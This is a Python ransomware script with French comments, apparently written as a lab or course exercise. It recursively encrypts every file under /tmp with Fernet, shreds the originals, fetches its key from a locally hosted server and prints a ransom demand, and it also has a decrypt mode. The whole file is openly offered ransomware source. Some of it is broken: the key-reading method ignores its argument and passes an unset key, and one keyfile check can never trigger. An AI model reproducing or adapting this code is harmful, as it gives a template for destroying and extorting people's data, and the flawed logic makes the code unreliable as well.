import os
from os.path import expanduser
from cryptography.fernet import Fernet
import base64
import http.server
import requests
import threading

"""     A LIRE """



"""     A LIRE """


class Ransomware:

    def __init__(self, key=None):
        """
        Initialisation de la classe Ransomware
        On utilise la même clé AES 128 pour chiffrer et déchiffrer
        
        Tous les fichiers, à savoir ceux qui sont nommés de la forme *.* sont concernés par le chiffrement.
        """

        self.key = key
        self.cryptor = None
        self.file_ext_targets = ["*"]


    def read_key(self, key):
        """
        Lis la clé dans le fichier keyfile_name
        """
        self.cryptor = Fernet(self.key)


    def write_key(self, keyfile_name):
        """
        Ecrit la clé téléchargée dans le fichier keyfile_name
        """
        print(self.key)
        with open(keyfile_name, 'wb') as f:
            f.write(self.key)
    

    def crypt_tmp(self, tmp_dir, encrypted=False):
        """
        Recursively encrypts or decrypts files from tmp directory with allowed file extensions
        Parcourt de façon récursive le dossier /tmp pour accéder à chaque fichier dans chaque sous dossier


        Args:
            tmp_dir:str: Absolute path of top level directory
            encrypt:bool: Specify whether to encrypt or decrypt encountered files
        """


        path ="/tmp"

        filelist = [] # On liste les chemins absolus de nos fichiers 

        for root, dirs, files in os.walk(path):
            for file in files:
                filelist.append(os.path.join(root,file)) #ajoute le chemin absolu à la liste filelist []

        for name in filelist:
            self.crypt_file(name, encrypted=encrypted) # chiffre tous les fichiers listés dans filelist []




    def crypt_file(self, file_path, encrypted=False):
        """
        Ecrit le nouveau fichier chiffré dans la forme xxxx.enc
        Sinon déchiffre le fichier xxxx.enc et l'écrit dans xxxx en enlevant .enc
        """
        if not encrypted:
            f = open(file_path, 'rb+')
            _data = f.read()
            data = self.cryptor.encrypt(_data)
            f_enc = open(file_path + ".enc", 'wb')
            f_enc.write(data)
            os.system("shred -v -z -u "+ file_path + " >/dev/null 2>&1")           
        else:
            f = open(file_path, 'rb+')
            _data = f.read()
            data = self.cryptor.decrypt(_data)
            f_dec = open(file_path.replace(".enc",""), 'wb')
            f_dec.write(data)
            os.system("shred -v -z -u " + file_path +" >/dev/null 2>&1") # redirige les erreurs de la sortie std dans la corbeille




"""
    MAIN
"""

if __name__ == '__main__':

    local_tmp = '/tmp' # emplacement du dossier à chiffrer

    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--action') #1er type d'argument pour déchiffrer avec --action decrypt
    parser.add_argument('--keyfile') #2ème type d'argument, pour placer la clé de déchiffrement avec --keyfile nom_de_la_clé
    args = parser.parse_args()
    action = args.action
    keyfile = args.keyfile    
    rware = Ransomware()
    url = 'http://127.0.0.1:8080/keyfile.txt' # adresse de la clé sur le serveur hébergé en local   
    keyfile = requests.get(url) # récupère la clé
    keyfile = keyfile.text
    print(keyfile)
    if action == 'decrypt':
        if keyfile is None:
            print('Veuillez spécifier le fichier de clé avec --keyfile')
        else:
            rware.read_key(keyfile)
            #cryptor = Fernet(keyfile)

            rware.crypt_tmp(local_tmp, encrypted=True)
    else: # si je ne déchiffre pas, je chiffre

        print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp. \n NE RELANCEZ PAS LE main.py SINON VOS FICHIERS SERONT PERDUS.")    
        rware.read_key(keyfile)
        #cryptor = Fernet(keyfile)
        rware.crypt_tmp(local_tmp) #lancement du chiffrement
